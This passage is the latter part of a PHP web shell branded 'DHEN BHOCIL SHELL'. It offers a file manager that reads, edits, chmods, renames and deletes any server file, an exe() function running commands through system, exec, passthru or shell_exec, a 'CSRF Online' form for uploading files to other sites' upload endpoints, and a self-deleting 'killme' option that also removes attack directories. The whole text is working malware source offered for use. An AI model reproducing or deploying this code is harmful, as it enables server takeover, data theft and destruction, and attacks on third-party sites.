  fclose ($fp);
  }else{
  gzclose($fp);}
  header("Content-Disposition: attachment; filename=" . $file);
  header("Content-Type: application/download");
  header("Content-Length: " . filesize($file));
  flush();

  $fp = fopen($file, "r");
  while (!feof($fp))
  {
      echo fread($fp, 65536);
      flush();
  }
  fclose($fp);
  }

} elseif($_GET['olle'] == 'killme') {
	$fileini = $_SERVER['SCRIPT_FILENAME'];
rmdir('sx_sym');rmdir('home');rmdir('olle_xploit_vhost');rmdir('sx_conf');unlink($fileini);
echo 'Byeee.... :(<br>Thanks for Using ';
} elseif ($_GET['olle'] == 'csrf') {
	# code...
	echo "<div style='text-align: center;' class='mybox'>
 <h2>..::CSRF Online::..</h2><br><br><hr color='red'><br>
    <form method='post'>
URL           : &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type='text' style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;' name='url' size='50' height='10' placeholder='http://target.com/[path]/upload.php' style='margin: 5px auto; padding-left: 5px;' required><br><br>
POST File : <input type='text' name='data' style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;' size='50' height='10' placeholder='Filedata / files[] / qqfile / userfile / dll' style='margin: 5px auto; padding-left: 5px;' required><br>
<br><input style='margin-top:4px;width:100px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver;' type='submit' name='go' value='Lock!'>
</form></div>";
        $url = $_POST['url'];
        $data = $_POST['data'];
        $submit = $_POST['go'];
        if ($submit) {
            echo "<br><form style='text-align:center' method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$data'><input style='width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;' type='submit' name='ok' class='kotak' value='Upload'>
    </form></div>";
        };
}

echo "</center></td></tr>";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#FFFFFF">Chmod OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Chmod ERROR!</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#FFFFFF">Rename OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Rename ERROR!</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>'; 
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#FFFFFF">Edit File OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Edit File ERROR!</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#FFFFFF">Delete DIR OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Delete DIR ERROR!</font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#FFFFFF">Delete OK</font><br/>';
}else{
echo '<font color="#B0B0B0">Delete ERROR!</font><br/>';
}
}
}
echo '</center>';
if(function_exists('opendir')) {
	if($opendir = opendir($path)) {
		while(($readdir = readdir($opendir)) !== false) {
			$scandir[] = $readdir;
		}
		closedir($opendir);
	}
	sort($scandir);
} else {
	$scandir = scandir($path);
}
echo '<div id="content"><table width="780" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permission</center></td>
<td><center>Modify</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="blue">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:#15CFF4;border:2px solid #15CFF4;border-radius:5px">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:#15CFF4;border:2px solid #15CFF4;border-radius:5px">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII="> <a href="?filesrc=<a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="blue">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:#15CFF4;border:2px solid #15CFF4;border-radius:5px">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">" style="margin-top:6px;width:20px;font-family:Kelly Slab;font-size:15;background:transparent;color:#15CFF4;border:2px solid #15CFF4;border-radius:5px">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<br><center><br/>
<div id="copy">
<font face="Kelly Slab" color="white" style="text-shadow: 0 0 20px blue, 0 0 5px blue, 0 0 7px blue, 0 0 20px blue; font-weight:bold: blue; font-size:20px">Copyright &copy; 2k20 </font> <font face="Kelly Slab" color="white" style="text-shadow: 0 0 20px blue, 0 0 5px blue, 0 0 7px blue, 0 0 20px blue; font-weight:bold: blue; font-size:20px">r00t ~ DHEN BHOCIL SHELL</font></div></center>
</body>
</html>';
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
 
if (($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}

$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
